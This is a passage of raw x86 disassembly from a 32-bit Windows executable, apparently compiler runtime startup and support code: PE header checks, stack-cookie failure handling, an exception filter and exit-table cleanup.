  405e25:	xor    eax,eax
  405e27:	mov    edx,0x4074a0
  405e2c:	push   0x6
  405e2e:	pop    ecx
  405e2f:	mov    edi,edx
  405e31:	rep stos DWORD PTR es:[edi],eax
  405e33:	mov    ds:0x4074b8,eax
  405e38:	mov    ecx,edx
  405e3a:	mov    ds:0x4074bc,eax
  405e3f:	mov    ds:0x4074c0,eax
  405e44:	mov    eax,0x400000
  405e49:	mov    DWORD PTR ds:0x407488,0x3c
  405e53:	mov    ds:0x407490,eax
  405e58:	mov    ds:0x40748c,eax
  405e5d:	mov    BYTE PTR ds:0x407494,0x1
  405e64:	mov    DWORD PTR ds:0x407498,0x800
  405e6e:	mov    DWORD PTR ds:0x40749c,0x401898
  405e78:	call   0x4028dd
  405e7d:	pop    edi
  405e7e:	test   eax,eax
  405e80:	jns    0x405e89
  405e82:	mov    BYTE PTR ds:0x407400,0x1
  405e89:	mov    eax,0x407488
  405e8e:	ret    
  405e8f:	int3   
  405e90:	int3   
  405e91:	int3   
  405e92:	int3   
  405e93:	int3   
  405e94:	mov    eax,ds:0x4074b8
  405e99:	test   eax,eax
  405e9b:	je     0x405eac
  405e9d:	push   eax
  405e9e:	call   DWORD PTR ds:0x40813c
  405ea4:	and    DWORD PTR ds:0x4074b8,0x0
  405eab:	pop    ecx
  405eac:	and    DWORD PTR ds:0x4074bc,0x0
  405eb3:	and    DWORD PTR ds:0x4074c0,0x0
  405eba:	ret    
  405ebb:	int3   
  405ebc:	int3   
  405ebd:	int3   
  405ebe:	int3   
  405ebf:	int3   
  405ec0:	mov    eax,ds:0x407050
  405ec5:	push   edi
  405ec6:	mov    edi,edx
  405ec8:	test   eax,eax
  405eca:	je     0x405f40
  405ecc:	cmp    eax,0x2c
  405ecf:	je     0x405ed8
  405ed1:	mov    eax,0x80070057
  405ed6:	pop    edi
  405ed7:	ret    
  405ed8:	mov    eax,ds:0x407074
  405edd:	push   ebx
  405ede:	xor    ebx,ebx
  405ee0:	push   esi
  405ee1:	mov    esi,ebx
  405ee3:	test   eax,eax
  405ee5:	jle    0x405f0a
  405ee7:	test   esi,esi
  405ee9:	js     0x405f44
  405eeb:	cmp    esi,eax
  405eed:	jge    0x405f44
  405eef:	mov    eax,ds:0x407070
  405ef4:	push   edi
  405ef5:	movzx  eax,WORD PTR [eax+esi*2]
  405ef9:	push   eax
  405efa:	call   DWORD PTR ds:0x4080ec
  405f00:	mov    eax,ds:0x407074
  405f05:	inc    esi
  405f06:	cmp    esi,eax
  405f08:	jl     0x405ee7
  405f0a:	mov    eax,ds:0x407070
  405f0f:	test   eax,eax
  405f11:	je     0x405f21
  405f13:	push   eax
  405f14:	call   DWORD PTR ds:0x40813c
  405f1a:	pop    ecx
  405f1b:	mov    DWORD PTR ds:0x407070,ebx
  405f21:	push   0x407054
  405f26:	mov    DWORD PTR ds:0x407074,ebx
  405f2c:	mov    DWORD PTR ds:0x407078,ebx
  405f32:	call   DWORD PTR ds:0x408064
  405f38:	pop    esi
  405f39:	mov    DWORD PTR ds:0x407050,ebx
  405f3f:	pop    ebx
  405f40:	xor    eax,eax
  405f42:	pop    edi
  405f43:	ret    
  405f44:	mov    ecx,0xc000008c
  405f49:	call   0x403d91
  405f4e:	int3   
  405f4f:	int3   
  405f50:	int3   
  405f51:	int3   
  405f52:	int3   
  405f53:	int3   
  405f54:	mov    eax,ds:0x407070
  405f59:	test   eax,eax
  405f5b:	je     0x405f6c
  405f5d:	push   eax
  405f5e:	call   DWORD PTR ds:0x40813c
  405f64:	and    DWORD PTR ds:0x407070,0x0
  405f6b:	pop    ecx
  405f6c:	and    DWORD PTR ds:0x407074,0x0
  405f73:	and    DWORD PTR ds:0x407078,0x0
  405f7a:	ret    
  405f7b:	int3   
  405f7c:	int3   
  405f7d:	int3   
  405f7e:	int3   
  405f7f:	int3   
  405f80:	jmp    0x406362
  405f85:	int3   
  405f86:	int3   
  405f87:	int3   
  405f88:	int3   
  405f89:	int3   
  405f8a:	jmp    0x405f80
  405f8f:	int3   
  405f90:	int3   
  405f91:	int3   
  405f92:	int3   
  405f93:	int3   
  405f94:	mov    edi,edi
  405f96:	push   ebp
  405f97:	mov    ebp,esp
  405f99:	pop    ebp
  405f9a:	jmp    0x405fa4
  405f9f:	int3   
  405fa0:	int3   
  405fa1:	int3   
  405fa2:	int3   
  405fa3:	int3   
  405fa4:	mov    edi,edi
  405fa6:	push   ebp
  405fa7:	mov    ebp,esp
  405fa9:	push   esi
  405faa:	jmp    0x405fb9
  405fac:	push   DWORD PTR [ebp+0x8]
  405faf:	call   0x406686
  405fb4:	pop    ecx
  405fb5:	test   eax,eax
  405fb7:	je     0x405fc8
  405fb9:	push   DWORD PTR [ebp+0x8]
  405fbc:	call   0x406356
  405fc1:	mov    esi,eax
  405fc3:	pop    ecx
  405fc4:	test   esi,esi
  405fc6:	je     0x405fac
  405fc8:	mov    eax,esi
  405fca:	pop    esi
  405fcb:	pop    ebp
  405fcc:	ret    
  405fcd:	int3   
  405fce:	int3   
  405fcf:	int3   
  405fd0:	int3   
  405fd1:	int3   
  405fd2:	int3   
  405fd3:	int3   
  405fd4:	int3   
  405fd5:	int3   
  405fd6:	int3   
  405fd7:	int3   
  405fd8:	int3   
  405fd9:	int3   
  405fda:	int3   
  405fdb:	int3   
  405fdc:	int3   
  405fdd:	int3   
  405fde:	int3   
  405fdf:	int3   
  405fe0:	mov    eax,0x5a4d
  405fe5:	cmp    WORD PTR ds:0x400000,ax
  405fec:	je     0x405ff2
  405fee:	xor    eax,eax
  405ff0:	jmp    0x406040
  405ff2:	mov    ecx,DWORD PTR ds:0x40003c
  405ff8:	cmp    DWORD PTR [ecx+0x400000],0x4550
  406002:	jne    0x405fee
  406004:	movzx  eax,WORD PTR [ecx+0x400018]
  40600b:	cmp    eax,0x10b
  406010:	je     0x40602c
  406012:	cmp    eax,0x20b
  406017:	jne    0x405fee
  406019:	xor    eax,eax
  40601b:	cmp    DWORD PTR [ecx+0x400084],0xe
  406022:	jbe    0x406040
  406024:	cmp    DWORD PTR [ecx+0x4000f8],eax
  40602a:	jmp    0x40603d
  40602c:	xor    eax,eax
  40602e:	cmp    DWORD PTR [ecx+0x400074],0xe
  406035:	jbe    0x406040
  406037:	cmp    DWORD PTR [ecx+0x4000e8],eax
  40603d:	setne  al
  406040:	push   0x2
  406042:	mov    ds:0x4070c8,eax
  406047:	call   0x40677e
  40604c:	push   eax
  40604d:	call   DWORD PTR ds:0x40810c
  406053:	or     DWORD PTR ds:0x4074cc,0xffffffff
  40605a:	or     DWORD PTR ds:0x4074d0,0xffffffff
  406061:	pop    ecx
  406062:	pop    ecx
  406063:	call   DWORD PTR ds:0x408168
  406069:	mov    ecx,DWORD PTR ds:0x4073f8
  40606f:	mov    DWORD PTR [eax],ecx
  406071:	call   DWORD PTR ds:0x408118
  406077:	mov    ecx,DWORD PTR ds:0x4073ec
  40607d:	mov    DWORD PTR [eax],ecx
  40607f:	call   0x402050
  406084:	cmp    DWORD PTR ds:0x407004,0x0
  40608b:	jne    0x406099
  40608d:	push   0x402050
  406092:	call   DWORD PTR ds:0x408164
  406098:	pop    ecx
  406099:	call   0x4069cf
  40609e:	xor    eax,eax
  4060a0:	ret    
  4060a1:	int3   
  4060a2:	int3   
  4060a3:	int3   
  4060a4:	int3   
  4060a5:	int3   
  4060a6:	int3   
  4060a7:	int3   
  4060a8:	int3   
  4060a9:	int3   
  4060aa:	int3   
  4060ab:	int3   
  4060ac:	int3   
  4060ad:	int3   
  4060ae:	int3   
  4060af:	int3   
  4060b0:	mov    eax,ds:0x4073f4
  4060b5:	push   0x4070cc
  4060ba:	push   DWORD PTR ds:0x4073f0
  4060c0:	mov    ds:0x4070cc,eax
  4060c5:	push   0x4070c0
  4060ca:	push   0x4070bc
  4060cf:	push   0x4070b8
  4060d4:	call   DWORD PTR ds:0x408110
  4060da:	add    esp,0x14
  4060dd:	mov    ds:0x4070c4,eax
  4060e2:	ret    
  4060e3:	int3   
  4060e4:	int3   
  4060e5:	int3   
  4060e6:	int3   
  4060e7:	int3   
  4060e8:	push   0x5c
  4060ea:	push   0x406ca8
  4060ef:	call   0x4069f4
  4060f4:	and    DWORD PTR [ebp-0x24],0x0
  4060f8:	and    DWORD PTR [ebp-0x4],0x0
  4060fc:	lea    eax,[ebp-0x6c]
  4060ff:	push   eax
  406100:	call   DWORD PTR ds:0x4080ac
  406106:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40610d:	xor    ebx,ebx
  40610f:	inc    ebx
  406110:	mov    DWORD PTR [ebp-0x4],ebx
  406113:	mov    eax,fs:0x18
  406119:	mov    edi,DWORD PTR [eax+0x4]
  40611c:	xor    esi,esi
  40611e:	mov    edx,0x4074c4
  406123:	mov    ecx,edi
  406125:	xor    eax,eax
  406127:	lock cmpxchg DWORD PTR [edx],ecx
  40612b:	test   eax,eax
  40612d:	je     0x406135
  40612f:	cmp    eax,edi
  406131:	jne    0x406147
  406133:	mov    esi,ebx
  406135:	cmp    DWORD PTR ds:0x4074c8,ebx
  40613b:	jne    0x406154
  40613d:	push   0x1f
  40613f:	call   0x4067ba
  406144:	pop    ecx
  406145:	jmp    0x406183
  406147:	push   0x3e8
  40614c:	call   DWORD PTR ds:0x408074
  406152:	jmp    0x40611e
  406154:	cmp    DWORD PTR ds:0x4074c8,0x0
  40615b:	jne    0x40617d
  40615d:	mov    DWORD PTR ds:0x4074c8,ebx
  406163:	push   0x401028
  406168:	push   0x40101c
  40616d:	call   0x4062d4
  406172:	pop    ecx
  406173:	pop    ecx
  406174:	test   eax,eax
  406176:	je     0x406183
  406178:	jmp    0x4062bd
  40617d:	mov    DWORD PTR ds:0x4070b4,ebx
  406183:	cmp    DWORD PTR ds:0x4074c8,ebx
  406189:	jne    0x4061a6
  40618b:	push   0x401018
  406190:	push   0x401000
  406195:	call   0x4069e8
  40619a:	pop    ecx
  40619b:	pop    ecx
  40619c:	mov    DWORD PTR ds:0x4074c8,0x2
  4061a6:	test   esi,esi
  4061a8:	jne    0x4061b3
  4061aa:	xor    eax,eax
  4061ac:	mov    ecx,0x4074c4
  4061b1:	xchg   DWORD PTR [ecx],eax
  4061b3:	cmp    DWORD PTR ds:0x4074d4,0x0
  4061ba:	je     0x4061e1
  4061bc:	push   0x4074d4
  4061c1:	call   0x406820
  4061c6:	pop    ecx
  4061c7:	test   eax,eax
  4061c9:	je     0x4061e1
  4061cb:	push   0x0
  4061cd:	push   0x2
  4061cf:	push   0x0
  4061d1:	mov    esi,DWORD PTR ds:0x4074d4
  4061d7:	mov    ecx,esi
  4061d9:	call   DWORD PTR ds:0x4081a0
  4061df:	call   esi
  4061e1:	mov    eax,ds:0x40815c
  4061e6:	mov    ecx,DWORD PTR [eax]
  4061e8:	test   ecx,ecx
  4061ea:	je     0x4062bd
  4061f0:	mov    DWORD PTR [ebp-0x20],ecx
  4061f3:	push   0x20
  4061f5:	pop    esi
  4061f6:	mov    edx,DWORD PTR [ebp-0x24]
  4061f9:	movzx  eax,WORD PTR [ecx]
  4061fc:	cmp    ax,si
  4061ff:	ja     0x406251
  406201:	test   ax,ax
  406204:	je     0x40620a
  406206:	test   edx,edx
  406208:	jne    0x406251
  40620a:	movzx  eax,WORD PTR [ecx]
  40620d:	test   ax,ax
  406210:	je     0x40621f
  406212:	cmp    ax,si
  406215:	ja     0x40621f
  406217:	add    ecx,0x2
  40621a:	mov    DWORD PTR [ebp-0x20],ecx
  40621d:	jmp    0x40620a
  40621f:	test   BYTE PTR [ebp-0x40],0x1
  406223:	je     0x40622b
  406225:	movzx  eax,WORD PTR [ebp-0x3c]
  406229:	jmp    0x40622e
  40622b:	push   0xa
  40622d:	pop    eax
  40622e:	push   eax
  40622f:	push   ecx
  406230:	push   0x0
  406232:	push   0x400000
  406237:	call   0x404d96
  40623c:	mov    ds:0x4070b0,eax
  406241:	cmp    DWORD PTR ds:0x4070c8,0x0
  406248:	jne    0x406299
  40624a:	push   eax
  40624b:	call   DWORD PTR ds:0x408108
  406251:	cmp    eax,0x22
  406254:	jne    0x406262
  406256:	xor    eax,eax
  406258:	test   edx,edx
  40625a:	sete   al
  40625d:	mov    edx,eax
  40625f:	mov    DWORD PTR [ebp-0x24],edx
  406262:	add    ecx,0x2
  406265:	mov    DWORD PTR [ebp-0x20],ecx
  406268:	jmp    0x4061f9
  40626a:	mov    ecx,DWORD PTR [ebp-0x14]
  40626d:	mov    eax,DWORD PTR [ecx]
  40626f:	mov    eax,DWORD PTR [eax]
  406271:	mov    DWORD PTR [ebp-0x28],eax
  406274:	push   ecx
  406275:	push   eax
  406276:	call   0x406704
  40627b:	pop    ecx
  40627c:	pop    ecx
  40627d:	ret    
  40627e:	mov    esp,DWORD PTR [ebp-0x18]
  406281:	mov    eax,DWORD PTR [ebp-0x28]
  406284:	mov    ds:0x4070b0,eax
  406289:	cmp    DWORD PTR ds:0x4070c8,0x0
  406290:	jne    0x406299
  406292:	push   eax
  406293:	call   DWORD PTR ds:0x408104
  406299:	cmp    DWORD PTR ds:0x4070b4,0x0
  4062a0:	jne    0x4062ad
  4062a2:	call   DWORD PTR ds:0x40816c
  4062a8:	mov    eax,ds:0x4070b0
  4062ad:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4062b4:	jmp    0x4062c9
  4062b6:	xor    eax,eax
  4062b8:	inc    eax
  4062b9:	ret    
  4062ba:	mov    esp,DWORD PTR [ebp-0x18]
  4062bd:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4062c4:	mov    eax,0xff
  4062c9:	call   0x406a3c
  4062ce:	ret    
  4062cf:	int3   
  4062d0:	int3   
  4062d1:	int3   
  4062d2:	int3   
  4062d3:	int3   
  4062d4:	mov    edi,edi
  4062d6:	push   ebp
  4062d7:	mov    ebp,esp
  4062d9:	push   ecx
  4062da:	mov    eax,ds:0x407008
  4062df:	xor    eax,ebp
  4062e1:	mov    DWORD PTR [ebp-0x4],eax
  4062e4:	push   esi
  4062e5:	mov    esi,DWORD PTR [ebp+0x8]
  4062e8:	xor    eax,eax
  4062ea:	cmp    esi,DWORD PTR [ebp+0xc]
  4062ed:	jae    0x40630d
  4062ef:	push   edi
  4062f0:	test   eax,eax
  4062f2:	jne    0x40630c
  4062f4:	mov    edi,DWORD PTR [esi]
  4062f6:	test   edi,edi
  4062f8:	je     0x406304
  4062fa:	mov    ecx,edi
  4062fc:	call   DWORD PTR ds:0x4081a0
  406302:	call   edi
  406304:	add    esi,0x4
  406307:	cmp    esi,DWORD PTR [ebp+0xc]
  40630a:	jb     0x4062f0
  40630c:	pop    edi
  40630d:	mov    ecx,DWORD PTR [ebp-0x4]
  406310:	xor    ecx,ebp
  406312:	pop    esi
  406313:	call   0x406340
  406318:	mov    esp,ebp
  40631a:	pop    ebp
  40631b:	ret    
  40631c:	int3   
  40631d:	int3   
  40631e:	int3   
  40631f:	int3   
  406320:	int3   
  406321:	int3   
  406322:	int3   
  406323:	int3   
  406324:	int3   
  406325:	int3   
  406326:	int3   
  406327:	int3   
  406328:	int3   
  406329:	int3   
  40632a:	int3   
  40632b:	int3   
  40632c:	int3   
  40632d:	int3   
  40632e:	int3   
  40632f:	int3   
  406330:	call   0x406928
  406335:	jmp    0x4060e8
  40633a:	int3   
  40633b:	int3   
  40633c:	int3   
  40633d:	int3   
  40633e:	int3   
  40633f:	int3   
  406340:	cmp    ecx,DWORD PTR ds:0x407008
  406346:	jne    0x40634b
  406348:	ret    0x0
  40634b:	jmp    0x4063eb
  406350:	int3   
  406351:	int3   
  406352:	int3   
  406353:	int3   
  406354:	int3   
  406355:	int3   
  406356:	jmp    DWORD PTR ds:0x408140
  40635c:	int3   
  40635d:	int3   
  40635e:	int3   
  40635f:	int3   
  406360:	int3   
  406361:	int3   
  406362:	jmp    DWORD PTR ds:0x40813c
  406368:	int3   
  406369:	int3   
  40636a:	int3   
  40636b:	int3   
  40636c:	int3   
  40636d:	int3   
  40636e:	int3   
  40636f:	int3   
  406370:	mov    edi,edi
  406372:	push   ebp
  406373:	mov    ebp,esp
  406375:	mov    ecx,DWORD PTR [ebp+0xc]
  406378:	test   ecx,ecx
  40637a:	je     0x4063a6
  40637c:	push   0xffffffe0
  40637e:	xor    edx,edx
  406380:	pop    eax
  406381:	div    ecx
  406383:	cmp    eax,DWORD PTR [ebp+0x10]
  406386:	jae    0x4063a6
  406388:	call   0x406a86
  40638d:	mov    DWORD PTR [eax],0xc
  406393:	xor    eax,eax
  406395:	push   eax
  406396:	push   eax
  406397:	push   eax
  406398:	push   eax
  406399:	push   eax
  40639a:	call   0x406a91
  40639f:	add    esp,0x14
  4063a2:	xor    eax,eax
  4063a4:	pop    ebp
  4063a5:	ret    
  4063a6:	imul   ecx,DWORD PTR [ebp+0x10]
  4063aa:	push   ecx
  4063ab:	push   DWORD PTR [ebp+0x8]
  4063ae:	call   0x406b48
  4063b3:	pop    ecx
  4063b4:	pop    ecx
  4063b5:	pop    ebp
  4063b6:	ret    
  4063b7:	int3   
  4063b8:	int3   
  4063b9:	int3   
  4063ba:	int3   
  4063bb:	int3   
  4063bc:	mov    edi,edi
  4063be:	push   ebp
  4063bf:	mov    ebp,esp
  4063c1:	push   0x0
  4063c3:	call   DWORD PTR ds:0x4080a4
  4063c9:	push   DWORD PTR [ebp+0x8]
  4063cc:	call   DWORD PTR ds:0x4080a8
  4063d2:	push   0xc0000409
  4063d7:	call   DWORD PTR ds:0x408054
  4063dd:	push   eax
  4063de:	call   DWORD PTR ds:0x4080a0
  4063e4:	pop    ebp
  4063e5:	ret    
  4063e6:	int3   
  4063e7:	int3   
  4063e8:	int3   
  4063e9:	int3   
  4063ea:	int3   
  4063eb:	mov    edi,edi
  4063ed:	push   ebp
  4063ee:	mov    ebp,esp
  4063f0:	sub    esp,0x324
  4063f6:	mov    ds:0x4071d0,eax
  4063fb:	mov    DWORD PTR ds:0x4071cc,ecx
  406401:	mov    DWORD PTR ds:0x4071c8,edx
  406407:	mov    DWORD PTR ds:0x4071c4,ebx
  40640d:	mov    DWORD PTR ds:0x4071c0,esi
  406413:	mov    DWORD PTR ds:0x4071bc,edi
  406419:	data16 mov WORD PTR ds:0x4071e8,ss
  406420:	data16 mov WORD PTR ds:0x4071dc,cs
  406427:	data16 mov WORD PTR ds:0x4071b8,ds
  40642e:	data16 mov WORD PTR ds:0x4071b4,es
  406435:	data16 mov WORD PTR ds:0x4071b0,fs
  40643c:	data16 mov WORD PTR ds:0x4071ac,gs
  406443:	pushf  
  406444:	pop    DWORD PTR ds:0x4071e0
  40644a:	mov    eax,DWORD PTR [ebp+0x0]
  40644d:	mov    ds:0x4071d4,eax
  406452:	mov    eax,DWORD PTR [ebp+0x4]
  406455:	mov    ds:0x4071d8,eax
  40645a:	lea    eax,[ebp+0x8]
  40645d:	mov    ds:0x4071e4,eax
  406462:	mov    eax,DWORD PTR [ebp-0x324]
  406468:	mov    DWORD PTR ds:0x407120,0x10001
  406472:	mov    eax,ds:0x4071d8
  406477:	mov    ds:0x4070dc,eax
  40647c:	mov    DWORD PTR ds:0x4070d0,0xc0000409
  406486:	mov    DWORD PTR ds:0x4070d4,0x1
  406490:	mov    DWORD PTR ds:0x4070e0,0x3
  40649a:	push   0x4
  40649c:	pop    eax
  40649d:	imul   eax,eax,0x0
  4064a0:	mov    DWORD PTR [eax+0x4070e4],0x2
  4064aa:	push   0x4
  4064ac:	pop    eax
  4064ad:	shl    eax,0x0
  4064b0:	mov    ecx,DWORD PTR ds:0x407008
  4064b6:	mov    DWORD PTR [eax+0x4070e4],ecx
  4064bc:	push   0x4
  4064be:	pop    eax
  4064bf:	shl    eax,1
  4064c1:	mov    ecx,DWORD PTR ds:0x40700c
  4064c7:	mov    DWORD PTR [eax+0x4070e4],ecx
  4064cd:	push   0x4
  4064cf:	pop    eax
  4064d0:	imul   eax,eax,0x0
  4064d3:	mov    ecx,DWORD PTR ds:0x407008
  4064d9:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4064dd:	push   0x4
  4064df:	pop    eax
  4064e0:	shl    eax,0x0
  4064e3:	mov    ecx,DWORD PTR ds:0x40700c
  4064e9:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4064ed:	push   0x401120
  4064f2:	call   0x4063bc
  4064f7:	mov    esp,ebp
  4064f9:	pop    ebp
  4064fa:	ret    
  4064fb:	int3   
  4064fc:	int3   
  4064fd:	int3   
  4064fe:	int3   
  4064ff:	int3   
  406500:	mov    edi,edi
  406502:	push   ebp
  406503:	mov    ebp,esp
  406505:	mov    ds:0x4071d0,eax
  40650a:	mov    DWORD PTR ds:0x4071cc,ecx
  406510:	mov    DWORD PTR ds:0x4071c8,edx
  406516:	mov    DWORD PTR ds:0x4071c4,ebx
  40651c:	mov    DWORD PTR ds:0x4071c0,esi
  406522:	mov    DWORD PTR ds:0x4071bc,edi
  406528:	data16 mov WORD PTR ds:0x4071e8,ss
  40652f:	data16 mov WORD PTR ds:0x4071dc,cs
  406536:	data16 mov WORD PTR ds:0x4071b8,ds
  40653d:	data16 mov WORD PTR ds:0x4071b4,es
  406544:	data16 mov WORD PTR ds:0x4071b0,fs
  40654b:	data16 mov WORD PTR ds:0x4071ac,gs
  406552:	pushf  
  406553:	pop    DWORD PTR ds:0x4071e0
  406559:	mov    DWORD PTR ds:0x407120,0x10001
  406563:	mov    eax,DWORD PTR [ebp+0x4]
  406566:	mov    ds:0x4071d8,eax
  40656b:	lea    eax,[ebp+0x4]
  40656e:	add    eax,0x4
  406571:	mov    ds:0x4071e4,eax
  406576:	mov    eax,ds:0x4071d8
  40657b:	mov    ds:0x4070dc,eax
  406580:	mov    DWORD PTR ds:0x4070d0,0xc0000409
  40658a:	mov    DWORD PTR ds:0x4070d4,0x1
  406594:	mov    DWORD PTR ds:0x4070e0,0x1
  40659e:	push   0x4
  4065a0:	pop    eax
  4065a1:	imul   eax,eax,0x0
  4065a4:	mov    DWORD PTR [eax+0x4070e4],0x8
  4065ae:	push   0x401120
  4065b3:	call   0x4063bc
  4065b8:	pop    ebp
  4065b9:	ret    
  4065ba:	int3   
  4065bb:	int3   
  4065bc:	int3   
  4065bd:	int3   
  4065be:	int3   
  4065bf:	int3   
  4065c0:	jmp    DWORD PTR ds:0x408134
  4065c6:	int3   
  4065c7:	int3   
  4065c8:	int3   
  4065c9:	int3   
  4065ca:	int3   
  4065cb:	push   0x18
  4065cd:	push   0x406cd0
  4065d2:	call   0x4069f4
  4065d7:	and    DWORD PTR [ebp-0x28],0x0
  4065db:	mov    eax,ds:0x4074d0
  4065e0:	mov    DWORD PTR [ebp-0x20],eax
  4065e3:	cmp    eax,0xffffffff
  4065e6:	jne    0x4065fe
  4065e8:	push   DWORD PTR [ebp+0x8]
  4065eb:	mov    esi,DWORD PTR ds:0x408120
  4065f1:	mov    ecx,esi
  4065f3:	call   DWORD PTR ds:0x4081a0
  4065f9:	call   esi
  4065fb:	pop    ecx
  4065fc:	jmp    0x406652
  4065fe:	push   0x8
  406600:	call   0x406b54
  406605:	pop    ecx
  406606:	and    DWORD PTR [ebp-0x4],0x0
  40660a:	mov    eax,ds:0x4074d0
  40660f:	mov    DWORD PTR [ebp-0x20],eax
  406612:	mov    eax,ds:0x4074cc
  406617:	mov    DWORD PTR [ebp-0x24],eax
  40661a:	lea    eax,[ebp-0x24]
  40661d:	push   eax
  40661e:	lea    eax,[ebp-0x20]
  406621:	push   eax
  406622:	push   DWORD PTR [ebp+0x8]
  406625:	call   0x406b6c
  40662a:	add    esp,0xc
  40662d:	mov    esi,eax
  40662f:	mov    DWORD PTR [ebp-0x28],esi
  406632:	mov    ecx,DWORD PTR [ebp-0x20]
  406635:	mov    DWORD PTR ds:0x4074d0,ecx
  40663b:	mov    ecx,DWORD PTR [ebp-0x24]
  40663e:	mov    DWORD PTR ds:0x4074cc,ecx
  406644:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40664b:	call   0x40665b
  406650:	mov    eax,esi
  406652:	call   0x406a3c
  406657:	ret    
  406658:	mov    esi,DWORD PTR [ebp-0x28]
  40665b:	push   0x8
  40665d:	call   0x406b60
  406662:	pop    ecx
  406663:	ret    
  406664:	int3   
  406665:	int3   
  406666:	int3   
  406667:	int3   
  406668:	int3   
  406669:	mov    edi,edi
  40666b:	push   ebp
  40666c:	mov    ebp,esp
  40666e:	push   DWORD PTR [ebp+0x8]
  406671:	call   0x4065cb
  406676:	neg    eax
  406678:	pop    ecx
  406679:	sbb    eax,eax
  40667b:	neg    eax
  40667d:	dec    eax
  40667e:	pop    ebp
  40667f:	ret    
  406680:	int3   
  406681:	int3   
  406682:	int3   
  406683:	int3   
  406684:	int3   
  406685:	int3   
  406686:	jmp    DWORD PTR ds:0x408128
  40668c:	int3   
  40668d:	int3   
  40668e:	int3   
  40668f:	int3   
  406690:	int3   
  406691:	int3   
  406692:	jmp    DWORD PTR ds:0x408124
  406698:	int3   
  406699:	int3   
  40669a:	int3   
  40669b:	int3   
  40669c:	int3   
  40669d:	int3   
  40669e:	int3   
  40669f:	int3   
  4066a0:	mov    edi,edi
  4066a2:	push   ebp
  4066a3:	mov    ebp,esp
  4066a5:	mov    eax,DWORD PTR [ebp+0x8]
  4066a8:	mov    eax,DWORD PTR [eax]
  4066aa:	cmp    DWORD PTR [eax],0xe06d7363
  4066b0:	jne    0x4066dd
  4066b2:	cmp    DWORD PTR [eax+0x10],0x3
  4066b6:	jne    0x4066dd
  4066b8:	mov    eax,DWORD PTR [eax+0x14]
  4066bb:	cmp    eax,0x19930520
  4066c0:	je     0x4066d7
  4066c2:	cmp    eax,0x19930521
  4066c7:	je     0x4066d7
  4066c9:	cmp    eax,0x19930522
  4066ce:	je     0x4066d7
  4066d0:	cmp    eax,0x1994000
  4066d5:	jne    0x4066dd
  4066d7:	call   DWORD PTR ds:0x4080f8
  4066dd:	xor    eax,eax
  4066df:	pop    ebp
  4066e0:	ret    0x4
  4066e3:	int3   
  4066e4:	int3   
  4066e5:	int3   
  4066e6:	int3   
  4066e7:	int3   
  4066e8:	int3   
  4066e9:	int3   
  4066ea:	int3   
  4066eb:	int3   
  4066ec:	int3   
  4066ed:	int3   
  4066ee:	int3   
  4066ef:	int3   
  4066f0:	push   0x4066a0
  4066f5:	call   DWORD PTR ds:0x4080a4
  4066fb:	xor    eax,eax
  4066fd:	ret    
  4066fe:	int3   
  4066ff:	int3   
  406700:	int3   
  406701:	int3   
  406702:	int3   
  406703:	int3   
  406704:	jmp    DWORD PTR ds:0x40811c
  40670a:	int3   
  40670b:	int3   
  40670c:	int3   
  40670d:	int3   
  40670e:	int3   
  40670f:	push   0xc
  406711:	push   0x406cf0
  406716:	call   0x406b78
  40671b:	xor    ecx,ecx
  40671d:	mov    eax,DWORD PTR [ebp+0x8]
  406720:	test   eax,eax
  406722:	je     0x40676f
  406724:	cmp    eax,0xffffffff
  406727:	je     0x40676f
  406729:	mov    DWORD PTR [ebp-0x4],ecx
  40672c:	mov    edx,0x5a4d
  406731:	cmp    WORD PTR [eax],dx
  406734:	jne    0x406768
  406736:	mov    edx,DWORD PTR [eax+0x3c]
  406739:	test   edx,edx
  40673b:	js     0x406768
  40673d:	cmp    edx,0x10000000
  406743:	jae    0x406768
  406745:	add    eax,edx
  406747:	mov    DWORD PTR [ebp-0x1c],eax
  40674a:	mov    ecx,DWORD PTR [eax]
  40674c:	sub    ecx,0x4550
  406752:	neg    ecx
  406754:	sbb    ecx,ecx
  406756:	not    ecx
  406758:	and    ecx,eax
  40675a:	jmp    0x406765
  40675c:	xor    eax,eax
  40675e:	inc    eax
  40675f:	ret    
  406760:	mov    esp,DWORD PTR [ebp-0x18]
  406763:	xor    ecx,ecx
  406765:	mov    DWORD PTR [ebp-0x1c],ecx
  406768:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40676f:	mov    eax,ecx
  406771:	call   0x406bbd
  406776:	ret    0x4
  406779:	int3   
  40677a:	int3   
  40677b:	int3   
  40677c:	int3   
  40677d:	int3   
  40677e:	mov    edi,edi
  406780:	push   ebp
  406781:	mov    ebp,esp
  406783:	push   0x0
  406785:	call   DWORD PTR ds:0x40809c
  40678b:	test   eax,eax
  40678d:	je     0x4067af
  40678f:	push   eax
  406790:	call   0x40670f
  406795:	test   eax,eax
  406797:	je     0x4067af
  406799:	movzx  ecx,WORD PTR [eax+0x5c]
  40679d:	push   0x2
  40679f:	pop    eax
  4067a0:	cmp    cx,ax
  4067a3:	je     0x4067b2
  4067a5:	cmp    ecx,0x3
  4067a8:	jne    0x4067af
  4067aa:	xor    eax,eax
  4067ac:	inc    eax
  4067ad:	pop    ebp
  4067ae:	ret    
  4067af:	mov    eax,DWORD PTR [ebp+0x8]
  4067b2:	pop    ebp
  4067b3:	ret    
  4067b4:	int3   
  4067b5:	int3   
  4067b6:	int3   
  4067b7:	int3   
  4067b8:	int3   
  4067b9:	int3   
  4067ba:	jmp    DWORD PTR ds:0x408114
  4067c0:	int3   
  4067c1:	int3   
  4067c2:	int3   
  4067c3:	int3   
  4067c4:	int3   
  4067c5:	int3   
  4067c6:	int3   
  4067c7:	int3   
  4067c8:	int3   
  4067c9:	int3   
  4067ca:	int3   
  4067cb:	int3   
  4067cc:	int3   
  4067cd:	int3   
  4067ce:	int3   
  4067cf:	int3   
  4067d0:	mov    edi,edi
  4067d2:	push   ebp
  4067d3:	mov    ebp,esp
  4067d5:	mov    eax,DWORD PTR [ebp+0x8]
  4067d8:	xor    edx,edx
  4067da:	push   ebx
  4067db:	push   esi
  4067dc:	push   edi
  4067dd:	mov    ecx,DWORD PTR [eax+0x3c]
  4067e0:	add    ecx,eax
  4067e2:	movzx  eax,WORD PTR [ecx+0x14]
  4067e6:	movzx  ebx,WORD PTR [ecx+0x6]
  4067ea:	add    eax,0x18
